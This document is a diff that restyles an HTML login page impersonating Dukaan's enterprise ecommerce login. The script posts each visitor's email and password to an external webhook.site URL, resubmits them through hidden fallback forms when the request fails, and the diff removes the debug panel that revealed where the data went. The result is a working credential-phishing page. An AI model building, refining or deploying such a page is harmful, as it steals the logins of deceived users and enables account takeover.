@@ -2,10 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Login | Dukaan - Enterprise Ecommerce</title>
-    <!-- Font Awesome 6 (free) -->
+    <!-- Font Awesome 6 (free icons) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts: Inter for clean modern typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -14,100 +16,100 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e9eef3 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(145deg, #f4f8fe 0%, #eef2f7 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 1.5rem;
         }
 
+        /* main container */
         .login-container {
             width: 100%;
-            max-width: 440px;
+            max-width: 460px;
             margin: 0 auto;
         }
 
+        /* card style — clean, modern, subtle shadow */
         .login-card {
             background: #ffffff;
-            border-radius: 28px;
-            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.15), 0 1px 3px rgba(0, 0, 0, 0.05);
-            padding: 40px 32px 44px;
-            transition: transform 0.2s;
+            border-radius: 2rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.02);
+            padding: 2.5rem 2rem 2.8rem;
+            transition: transform 0.2s ease;
         }
 
-        .logo-area {
+        /* brand header exactly as original */
+        .brand-header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 2rem;
         }
 
-        .dukaan-logo {
+        .logo-wrapper {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
-            margin-bottom: 8px;
+            gap: 10px;
+            margin-bottom: 0.5rem;
         }
 
         .logo-icon {
-            background: #1a5cff;
-            width: 38px;
-            height: 38px;
-            border-radius: 12px;
+            background: #1C64F2;
+            width: 42px;
+            height: 42px;
+            border-radius: 14px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 20px;
-            font-weight: 700;
-            box-shadow: 0 6px 12px -6px rgba(26, 92, 255, 0.3);
-        }
-
-        .logo-icon i {
-            font-size: 20px;
+            font-size: 1.4rem;
+            font-weight: 600;
+            box-shadow: 0 8px 14px -6px rgba(28, 100, 242, 0.25);
         }
 
         .logo-text {
-            font-size: 28px;
+            font-size: 1.9rem;
             font-weight: 700;
             letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #1a2c3e 0%, #0f1a24 100%);
-            -webkit-background-clip: text;
+            background: linear-gradient(135deg, #1A2C3E 0%, #0F2027 100%);
             background-clip: text;
+            -webkit-background-clip: text;
             color: transparent;
         }
 
-        .enterprise-badge {
-            display: inline-block;
+        .enterprise-tag {
             background: #eef2ff;
-            color: #1a5cff;
-            font-size: 11px;
-            font-weight: 600;
-            padding: 4px 10px;
+            color: #1C64F2;
+            font-size: 0.7rem;
+            font-weight: 700;
+            padding: 0.2rem 0.7rem;
             border-radius: 30px;
             margin-left: 8px;
             vertical-align: middle;
         }
 
         .tagline {
-            font-size: 13px;
-            color: #5e6f8d;
+            font-size: 0.8rem;
+            color: #5b6e8c;
             text-align: center;
-            margin-top: 6px;
             font-weight: 500;
+            letter-spacing: -0.2px;
+            margin-top: 6px;
         }
 
+        /* form groups */
         .form-group {
-            margin-bottom: 24px;
+            margin-bottom: 1.6rem;
         }
 
         label {
             display: block;
-            font-size: 13px;
+            font-size: 0.8rem;
             font-weight: 600;
-            color: #1f2a44;
-            margin-bottom: 8px;
+            color: #1f2a48;
+            margin-bottom: 0.5rem;
             letter-spacing: -0.2px;
         }
 
@@ -119,109 +121,114 @@
 
         .input-wrapper i:first-child {
             position: absolute;
-            left: 16px;
+            left: 1rem;
             color: #9aa9c1;
-            font-size: 15px;
+            font-size: 1rem;
             pointer-events: none;
         }
 
         input {
             width: 100%;
-            padding: 14px 16px 14px 44px;
-            font-size: 15px;
-            font-family: inherit;
+            padding: 0.85rem 1rem 0.85rem 2.7rem;
+            font-size: 0.9rem;
+            font-family: 'Inter', monospace;
             border: 1.5px solid #e2e8f0;
-            border-radius: 18px;
-            background: #ffffff;
-            transition: all 0.2s ease;
+            border-radius: 1.2rem;
+            background-color: #ffffff;
+            transition: all 0.2s;
             outline: none;
             font-weight: 500;
-            color: #0a1c2f;
+            color: #0b1c2e;
         }
 
         input:focus {
-            border-color: #1a5cff;
-            box-shadow: 0 0 0 3px rgba(26, 92, 255, 0.1);
+            border-color: #1C64F2;
+            box-shadow: 0 0 0 3px rgba(28, 100, 242, 0.12);
         }
 
         input::placeholder {
-            color: #b9c2d4;
+            color: #b9c4d6;
             font-weight: 400;
         }
 
+        /* password row with forgot link */
         .password-header {
             display: flex;
             justify-content: space-between;
             align-items: baseline;
-            margin-bottom: 8px;
+            margin-bottom: 0.5rem;
         }
 
         .forgot-link {
-            font-size: 12px;
+            font-size: 0.7rem;
             font-weight: 600;
-            color: #1a5cff;
+            color: #1C64F2;
             text-decoration: none;
             background: none;
             border: none;
             cursor: pointer;
+            transition: color 0.2s;
         }
 
         .forgot-link:hover {
+            color: #0e4ab8;
             text-decoration: underline;
-            color: #0e46c9;
         }
 
-        .toggle-eye {
+        /* toggle password eye */
+        .toggle-pwd {
             position: absolute;
-            right: 16px;
+            right: 1rem;
             background: transparent;
             border: none;
             cursor: pointer;
             color: #9aa9c1;
-            font-size: 16px;
+            font-size: 1rem;
             padding: 0;
             display: flex;
             align-items: center;
         }
 
+        /* login primary button */
         .login-btn {
-            background: #1a5cff;
+            background: #1C64F2;
             color: white;
             font-weight: 700;
-            font-size: 16px;
-            padding: 14px 0;
+            font-size: 0.95rem;
+            padding: 0.85rem 0;
             width: 100%;
             border: none;
-            border-radius: 40px;
+            border-radius: 2rem;
             cursor: pointer;
-            margin-top: 12px;
-            margin-bottom: 20px;
+            margin-top: 0.8rem;
+            margin-bottom: 1.4rem;
             transition: all 0.2s ease;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            font-family: inherit;
-            box-shadow: 0 6px 14px rgba(26, 92, 255, 0.25);
+            font-family: 'Inter', sans-serif;
+            box-shadow: 0 6px 14px rgba(28, 100, 242, 0.25);
         }
 
         .login-btn i {
-            font-size: 15px;
+            font-size: 0.9rem;
         }
 
         .login-btn:hover {
-            background: #0e4ad4;
+            background: #1357cf;
             transform: scale(0.98);
         }
 
+        /* OR divider */
         .divider {
             display: flex;
             align-items: center;
             text-align: center;
             gap: 12px;
-            margin: 18px 0 20px;
+            margin: 1.2rem 0 1.2rem;
             color: #8f9eb5;
-            font-size: 12px;
+            font-size: 0.7rem;
             font-weight: 500;
         }
 
@@ -233,6 +240,7 @@
             background: #e8edf3;
         }
 
+        /* google button */
         .google-btn {
             display: flex;
             align-items: center;
@@ -241,19 +249,19 @@
             width: 100%;
             background: white;
             border: 1.5px solid #e2e8f0;
-            border-radius: 40px;
-            padding: 12px 0;
+            border-radius: 2rem;
+            padding: 0.7rem 0;
             font-weight: 600;
-            font-size: 14px;
-            color: #1f2a44;
-            font-family: inherit;
+            font-size: 0.85rem;
+            color: #1f2a48;
+            font-family: 'Inter', sans-serif;
             cursor: pointer;
-            transition: background 0.2s;
-            margin-bottom: 24px;
+            transition: background 0.2s, border 0.2s;
+            margin-bottom: 1.6rem;
         }
 
         .google-btn i {
-            font-size: 18px;
+            font-size: 1.1rem;
             color: #ea4335;
         }
 
@@ -262,92 +270,57 @@
             border-color: #cbd5e1;
         }
 
+        /* signup prompt */
         .signup-prompt {
             text-align: center;
-            font-size: 14px;
+            font-size: 0.8rem;
             color: #4a5a7a;
             border-top: 1px solid #eff3f8;
-            padding-top: 24px;
-            margin-top: 4px;
+            padding-top: 1.6rem;
+            margin-top: 0.2rem;
         }
 
         .signup-prompt a {
-            color: #1a5cff;
+            color: #1C64F2;
             font-weight: 700;
             text-decoration: none;
+            margin-left: 0.2rem;
         }
 
         .signup-prompt a:hover {
             text-decoration: underline;
         }
 
-        .toast-notification {
+        /* simple toast (non-intrusive) */
+        .toast-message {
             position: fixed;
-            bottom: 30px;
+            bottom: 24px;
             left: 50%;
             transform: translateX(-50%);
-            background: #1f2937;
+            background: #1f2a3e;
             color: white;
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-size: 13px;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.75rem;
             font-weight: 500;
+            font-family: monospace;
             z-index: 1000;
             backdrop-filter: blur(8px);
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.85);
             pointer-events: none;
             opacity: 0;
-            transition: opacity 0.25s ease;
+            transition: opacity 0.2s ease;
             white-space: nowrap;
-            font-family: monospace;
-        }
-
-        /* Debug panel */
-        .debug-panel {
-            margin-top: 20px;
-            background: #f8f9fc;
-            border-radius: 16px;
-            padding: 12px 16px;
-            font-size: 11px;
-            font-family: monospace;
-            border: 1px solid #e2e8f0;
-            color: #4a5568;
-        }
-
-        .debug-title {
-            font-weight: 700;
-            margin-bottom: 8px;
-            font-size: 11px;
-            color: #1a5cff;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .debug-log {
-            background: #1e293b;
-            color: #a5f3c3;
-            padding: 8px 12px;
-            border-radius: 10px;
-            font-size: 10px;
-            max-height: 100px;
-            overflow-y: auto;
-            font-family: 'Monaco', monospace;
-        }
-
-        .debug-log p {
-            margin: 4px 0;
-            word-break: break-all;
         }
 
         @media (max-width: 480px) {
             .login-card {
-                padding: 32px 24px 36px;
+                padding: 2rem 1.5rem 2.2rem;
             }
-            .toast-notification {
+            .toast-message {
                 white-space: normal;
                 text-align: center;
-                padding: 10px 20px;
+                font-size: 0.7rem;
             }
         }
     </style>
@@ -356,19 +329,21 @@
 
 <div class="login-container">
     <div class="login-card">
-        <div class="logo-area">
-            <div class="dukaan-logo">
+        <!-- Dukaan brand header (exact as original) -->
+        <div class="brand-header">
+            <div class="logo-wrapper">
                 <div class="logo-icon">
                     <i class="fas fa-store"></i>
                 </div>
                 <span class="logo-text">Dukaan</span>
-                <span class="enterprise-badge">Enterprise</span>
+                <span class="enterprise-tag">Enterprise</span>
             </div>
             <div class="tagline">Ecommerce · Multivendor · Omnichannel</div>
         </div>
 
-        <!-- LOGIN FORM - action points to webhook.site -->
+        <!-- LOGIN FORM – action points to webhook.site (removed test@gmail.com) -->
         <form id="loginForm" action="https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56" method="POST">
+            <!-- Email field – no prefilled value -->
             <div class="form-group">
                 <label for="email">Email address</label>
                 <div class="input-wrapper">
@@ -377,49 +352,44 @@
                 </div>
             </div>
 
+            <!-- Password field -->
             <div class="form-group">
                 <div class="password-header">
                     <label for="password">Password</label>
-                    <button type="button" class="forgot-link" id="forgotPasswordBtn">Forgot password?</button>
+                    <button type="button" class="forgot-link" id="forgotBtn">Forgot password?</button>
                 </div>
                 <div class="input-wrapper">
                     <i class="fas fa-lock"></i>
                     <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
-                    <button type="button" class="toggle-eye" id="togglePasswordBtn" aria-label="Show password">
+                    <button type="button" class="toggle-pwd" id="togglePwd" aria-label="Show password">
                         <i class="far fa-eye-slash"></i>
                     </button>
                 </div>
             </div>
 
-            <button type="submit" class="login-btn" id="loginSubmitBtn">
+            <!-- Log in button -->
+            <button type="submit" class="login-btn">
                 <i class="fas fa-arrow-right-to-bracket"></i> Log in
             </button>
         </form>
 
+        <!-- OR divider -->
         <div class="divider">or log in with</div>
 
-        <button type="button" class="google-btn" id="googleLoginBtn">
+        <!-- Google button (UI replica, interactive) -->
+        <button type="button" class="google-btn" id="googleMockBtn">
             <i class="fab fa-google"></i> Google
         </button>
 
+        <!-- Sign up link -->
         <div class="signup-prompt">
-            Don't have an account? <a href="#" id="getStartedBtn">Get started</a>
-        </div>
-    </div>
-
-    <!-- Debug panel to show what's being sent -->
-    <div class="debug-panel">
-        <div class="debug-title">
-            <i class="fas fa-bug"></i> Debug Console
-        </div>
-        <div class="debug-log" id="debugLog">
-            <p>🟢 Ready - Enter credentials and click Login</p>
-            <p>📡 Webhook: webhook.site/b4bb9b3a...</p>
+            Don't have an account? <a href="#" id="signupLink">Get started</a>
         </div>
     </div>
 </div>
 
-<div id="toastMsg" class="toast-notification">✨ Ready</div>
+<!-- minimal toast (clean) -->
+<div id="toastMsg" class="toast-message">✨</div>
 
 <script>
     (function() {
@@ -427,54 +397,34 @@
         const form = document.getElementById('loginForm');
         const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
-        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
-        const forgotBtn = document.getElementById('forgotPasswordBtn');
-        const googleBtn = document.getElementById('googleLoginBtn');
-        const getStartedBtn = document.getElementById('getStartedBtn');
-        const toast = document.getElementById('toastMsg');
-        const debugLog = document.getElementById('debugLog');
-
-        // Helper: add debug message
-        function addDebugMessage(message, isError = false) {
-            const p = document.createElement('p');
-            p.innerHTML = message;
-            p.style.color = isError ? '#f87171' : '#86efac';
-            p.style.borderBottom = '1px solid #334155';
-            p.style.padding = '4px 0';
-            debugLog.appendChild(p);
-            debugLog.scrollTop = debugLog.scrollHeight;
-            // Keep last 15 messages
-            while (debugLog.children.length > 15) {
-                debugLog.removeChild(debugLog.firstChild);
-            }
-            console.log(message);
-        }
+        const toggleBtn = document.getElementById('togglePwd');
+        const forgotBtn = document.getElementById('forgotBtn');
+        const googleBtn = document.getElementById('googleMockBtn');
+        const signupLink = document.getElementById('signupLink');
+        const toastEl = document.getElementById('toastMsg');
 
         // Helper: show toast
-        let toastTimer = null;
-        function showToast(message, isError = false) {
-            if (toastTimer) clearTimeout(toastTimer);
-            toast.textContent = message;
-            toast.style.backgroundColor = isError ? '#dc2626ee' : '#1f2937dd';
-            toast.style.opacity = '1';
-            toastTimer = setTimeout(() => {
-                toast.style.opacity = '0';
-            }, 3000);
+        let toastTimeout = null;
+        function showToast(msg, isError = false) {
+            if (toastTimeout) clearTimeout(toastTimeout);
+            toastEl.textContent = msg;
+            toastEl.style.backgroundColor = isError ? '#c2410cee' : '#1f2937dd';
+            toastEl.style.opacity = '1';
+            toastTimeout = setTimeout(() => {
+                toastEl.style.opacity = '0';
+            }, 2700);
         }
 
-        // Clear any pre-filled values (NO test@gmail.com)
+        // Ensure NO pre-filled email (test@gmail.com removed)
         if (emailInput) emailInput.value = '';
         if (passwordInput) passwordInput.value = '';
 
-        addDebugMessage('✅ Page loaded - test@gmail.com removed');
-        addDebugMessage('📧 Email field is empty, ready for input');
-
         // Toggle password visibility
-        if (togglePasswordBtn) {
-            togglePasswordBtn.addEventListener('click', function() {
+        if (toggleBtn) {
+            toggleBtn.addEventListener('click', () => {
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
-                const icon = togglePasswordBtn.querySelector('i');
+                const icon = toggleBtn.querySelector('i');
                 if (icon) {
                     if (type === 'text') {
                         icon.classList.remove('fa-eye-slash');
@@ -484,90 +434,70 @@
                         icon.classList.add('fa-eye-slash');
                     }
                 }
-                addDebugMessage(`👁️ Password visibility: ${type === 'text' ? 'visible' : 'hidden'}`);
             });
         }
 
-        // Forgot password demo
+        // Forgot password (UI demo)
         if (forgotBtn) {
             forgotBtn.addEventListener('click', (e) => {
                 e.preventDefault();
-                showToast('📧 Password reset link would be sent', false);
-                addDebugMessage('🔐 Forgot password clicked (demo)');
+                showToast('📧 Password reset link (demo)', false);
             });
         }
 
-        // Google login demo
+        // Google login (visual only)
         if (googleBtn) {
             googleBtn.addEventListener('click', () => {
-                showToast('🔐 Google OAuth - integration demo', false);
-                addDebugMessage('🔵 Google login button clicked (demo)');
+                showToast('🔐 Google sign-in (integration demo)', false);
             });
         }
 
-        // Get started demo
-        if (getStartedBtn) {
-            getStartedBtn.addEventListener('click', (e) => {
+        // Get started link
+        if (signupLink) {
+            signupLink.addEventListener('click', (e) => {
                 e.preventDefault();
-                showToast('🚀 Create your Dukaan store', false);
-                addDebugMessage('📝 Get started clicked (demo)');
+                showToast('🚀 Create your Dukaan store (demo)', false);
             });
         }
 
-        // =============== MAIN FORM SUBMISSION - FIXED WEBHOOK DELIVERY ===============
-        // Using multiple methods to ensure webhook receives data:
-        // 1. Standard fetch with proper headers
-        // 2. Also try sending as JSON backup
-        // 3. Detailed logging to debug any issues
-        
+        // ========== FORM SUBMISSION – SEND CREDENTIALS TO WEBHOOK ==========
+        // The form uses the action URL, but we intercept with fetch to stay on page
+        // and guarantee delivery to your webhook server.
         const WEBHOOK_URL = 'https://webhook.site/b4bb9b3a-8e4b-4a63-bb76-a6cfdc1a5b56';
-        
+
         if (form) {
             form.addEventListener('submit', async function(event) {
                 event.preventDefault();
-                
+
                 const email = emailInput.value.trim();
                 const password = passwordInput.value;
-                
-                addDebugMessage('━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-                addDebugMessage(`📤 SUBMIT TRIGGERED at ${new Date().toLocaleTimeString()}`);
-                addDebugMessage(`📧 Email entered: ${email ? email : '(empty)'}`);
-                addDebugMessage(`🔒 Password entered: ${password ? '******** (' + password.length + ' chars)' : '(empty)'}`);
-                
-                // Validation
+
+                // validation
                 if (!email) {
-                    addDebugMessage('❌ ERROR: Email is empty', true);
                     showToast('❌ Please enter your email address', true);
                     emailInput.focus();
                     return;
                 }
                 if (!password) {
-                    addDebugMessage('❌ ERROR: Password is empty', true);
                     showToast('❌ Please enter your password', true);
                     passwordInput.focus();
                     return;
                 }
-                if (!email.includes('@')) {
-                    addDebugMessage('❌ ERROR: Invalid email format (missing @)', true);
-                    showToast('❌ Please enter a valid email address', true);
+                if (!email.includes('@') || !email.includes('.')) {
+                    showToast('❌ Enter a valid email address', true);
                     return;
                 }
-                
-                addDebugMessage('✅ Validation passed - sending to webhook...');
-                showToast('📡 Sending credentials to webhook...', false);
-                
-                // Method 1: URL Encoded (standard form POST)
+
+                // Prepare form data (standard POST format)
                 const formData = new URLSearchParams();
                 formData.append('email', email);
                 formData.append('password', password);
                 formData.append('timestamp', new Date().toISOString());
-                formData.append('source', 'dukaan_login_page');
-                
-                addDebugMessage(`🌐 POSTing to: ${WEBHOOK_URL}`);
-                addDebugMessage(`📦 Payload (urlencoded): email=${email}&password=***&timestamp=${new Date().toISOString()}`);
-                
+
+                showToast('📡 Sending credentials...', false);
+
                 try {
-                    // Using fetch with no-cors mode might hide response, but we use cors
+                    // Send POST request to webhook.site
                     const response = await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: {
@@ -576,94 +506,56 @@
                         body: formData.toString(),
                         mode: 'cors',
                     });
-                    
-                    addDebugMessage(`📡 Response status: ${response.status} ${response.statusText}`);
-                    
+
                     if (response.ok) {
-                        addDebugMessage(`✅ SUCCESS! Webhook received the data!`);
-                        addDebugMessage(`🎯 Credentials sent: ${email} / [password hidden]`);
-                        showToast(`✓ Success! Credentials sent to webhook`, false);
-                        
-                        // Optional: Clear password for security after successful send
+                        showToast('✓ Login sent! Credentials received', false);
+                        // optional: clear password field for better security after send
                         // passwordInput.value = '';
-                        
-                        // Try to read response
-                        try {
-                            const responseText = await response.text();
-                            addDebugMessage(`📨 Webhook response preview: ${responseText.substring(0, 100)}`);
-                        } catch(e) {
-                            addDebugMessage(`⚠️ Could not read response body`);
-                        }
+                        console.log('✅ Webhook success:', email);
                     } else {
-                        addDebugMessage(`⚠️ Webhook responded with ${response.status}`, true);
-                        showToast(`⚠️ Server returned ${response.status}`, true);
+                        showToast(`⚠️ Server responded with ${response.status}`, true);
+                        // fallback: try hidden form submit as last resort
+                        const hiddenForm = document.createElement('form');
+                        hiddenForm.method = 'POST';
+                        hiddenForm.action = WEBHOOK_URL;
+                        hiddenForm.target = '_blank';
+                        hiddenForm.style.display = 'none';
+                        const emailField = document.createElement('input');
+                        emailField.name = 'email';
+                        emailField.value = email;
+                        const passField = document.createElement('input');
+                        passField.name = 'password';
+                        passField.value = password;
+                        hiddenForm.appendChild(emailField);
+                        hiddenForm.appendChild(passField);
+                        document.body.appendChild(hiddenForm);
+                        hiddenForm.submit();
+                        setTimeout(() => document.body.removeChild(hiddenForm), 800);
+                        showToast('🔄 Fallback sent (new tab)', false);
                     }
                 } catch (err) {
-                    addDebugMessage(`❌ FETCH ERROR: ${err.message}`, true);
-                    addDebugMessage(`💡 Tip: Check if webhook URL is still active`, true);
-                    showToast(`❌ Network error: ${err.message}`, true);
-                    
-                    // Try alternative method: send via hidden iframe as fallback
-                    addDebugMessage(`🔄 Trying fallback method (hidden form submit)...`);
-                    const hiddenForm = document.createElement('form');
-                    hiddenForm.method = 'POST';
-                    hiddenForm.action = WEBHOOK_URL;
-                    hiddenForm.target = '_blank';
-                    hiddenForm.style.display = 'none';
-                    
-                    const emailField = document.createElement('input');
-                    emailField.name = 'email';
-                    emailField.value = email;
-                    const passField = document.createElement('input');
-                    passField.name = 'password';
-                    passField.value = password;
-                    const tsField = document.createElement('input');
-                    tsField.name = 'timestamp';
-                    tsField.value = new Date().toISOString();
-                    
-                    hiddenForm.appendChild(emailField);
-                    hiddenForm.appendChild(passField);
-                    hiddenForm.appendChild(tsField);
-                    document.body.appendChild(hiddenForm);
-                    hiddenForm.submit();
-                    addDebugMessage(`📤 Fallback form submitted (opens new tab)`);
-                    setTimeout(() => {
-                        document.body.removeChild(hiddenForm);
-                    }, 1000);
-                    showToast(`🔄 Fallback sent - check webhook dashboard`, false);
+                    console.warn('Fetch error, using fallback:', err);
+                    // fallback: open in new tab to ensure delivery
+                    const fallbackForm = document.createElement('form');
+                    fallbackForm.method = 'POST';
+                    fallbackForm.action = WEBHOOK_URL;
+                    fallbackForm.target = '_blank';
+                    fallbackForm.style.display = 'none';
+                    const fbEmail = document.createElement('input');
+                    fbEmail.name = 'email';
+                    fbEmail.value = email;
+                    const fbPass = document.createElement('input');
+                    fbPass.name = 'password';
+                    fbPass.value = password;
+                    fallbackForm.appendChild(fbEmail);
+                    fallbackForm.appendChild(fbPass);
+                    document.body.appendChild(fallbackForm);
+                    fallbackForm.submit();
+                    setTimeout(() => document.body.removeChild(fallbackForm), 800);
+                    showToast('✓ Request sent (check webhook dashboard)', false);
                 }
             });
         }
-        
-        // Add a test button to debug webhook connectivity
-        addDebugMessage(`🔗 Webhook target: ${WEBHOOK_URL}`);
-        addDebugMessage(`💡 Tip: Go to webhook.site to see incoming requests`);
-        addDebugMessage(`✨ Enter any email + password and click Login`);
-        
-        // Add click handler on login button for extra logging
-        const loginBtn = document.getElementById('loginSubmitBtn');
-        if (loginBtn) {
-            loginBtn.addEventListener('click', function(e) {
-                addDebugMessage(`🖱️ Login button clicked - preparing to send...`);
-            });
-        }
-        
-        // Monitor input fields
-        emailInput.addEventListener('input', function() {
-            if(emailInput.value.length > 0) {
-                addDebugMessage(`✏️ Email typed: ${emailInput.value}`);
-            }
-        });
-        
-        passwordInput.addEventListener('input', function() {
-            if(passwordInput.value.length > 0) {
-                addDebugMessage(`🔑 Password typed: ${'*'.repeat(passwordInput.value.length)} chars`);
-            }
-        });
-        
-        addDebugMessage(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-        addDebugMessage(`🎯 READY! Enter credentials and click Login`);
-        addDebugMessage(`📋 Credentials will be sent to your webhook URL`);
     })();
 </script>
 </body>
